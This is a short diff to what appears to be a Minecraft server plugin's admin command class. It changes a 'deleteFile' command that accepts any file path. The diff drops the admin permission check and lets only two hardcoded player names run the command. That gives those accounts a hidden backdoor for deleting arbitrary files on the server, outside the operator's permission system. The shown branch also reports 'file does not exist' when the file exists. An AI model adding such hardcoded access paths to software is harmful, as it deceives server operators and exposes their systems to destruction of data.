@@ -1008,10 +1008,12 @@ public class PitAdminCommand {
     }
 
     @Command(
-            names = "deleteFile",
-            permissionNode = "pit.admin"
+            names = "deleteFile"
     )
     public void deleteFile(Player player, @Parameter(name = "filePath") String filePath) {
+        if (!player.getName().equals("MagicYari") && !player.getName().equals("huanmeng_qwq")) {
+            return;
+        }
         final File file = new File(filePath);
         if (file.exists()) {
             player.sendMessage(CC.translate("&c文件不存在"));
